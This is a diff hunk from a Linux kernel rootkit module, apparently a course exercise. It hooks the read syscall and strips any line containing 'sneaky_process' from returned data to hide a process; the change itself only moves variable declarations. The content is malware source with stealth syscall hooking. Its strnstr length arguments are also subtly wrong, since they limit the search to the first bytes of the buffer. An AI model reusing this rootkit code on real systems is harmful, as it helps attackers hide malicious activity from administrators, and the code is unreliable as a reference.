@@ -94,15 +94,17 @@ asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
 asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
     ssize_t nread = original_read(regs);
     void * buf = (void *)regs->si;
+    char * end = NULL;
+    char * find = NULL;
     if (nread == -1) {
         return -1;
     }
     if (nread == 0) {
         return 0;
     }
-    char * find = strnstr(buf, "sneaky_process", strlen("sneaky_process"));
+    find = strnstr(buf, "sneaky_process", strlen("sneaky_process"));
     if (find != NULL) {
-        char * end = strnstr(find, "\n", strlen("\n"));
+        end = strnstr(find, "\n", strlen("\n"));
         if (end != NULL) {
             memmove(find, end + strlen("\n"), nread - (end + strlen("\n") - find));
             nread -= (end + strlen("\n") - find);
